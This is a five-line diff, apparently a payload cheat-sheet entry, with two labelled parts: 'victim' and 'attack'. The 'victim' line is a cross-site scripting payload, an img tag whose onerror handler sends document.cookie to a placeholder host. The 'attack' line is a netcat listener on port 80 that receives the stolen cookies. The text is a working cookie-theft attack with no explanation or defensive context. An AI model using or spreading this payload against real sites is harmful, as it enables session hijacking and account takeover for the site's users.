@@ -1,0 +1,5 @@
+victim : 
+<img src=x onerror=this.src='http://ip/?c='+document.cookie>
+
+attack :
+nc -lvvp 80
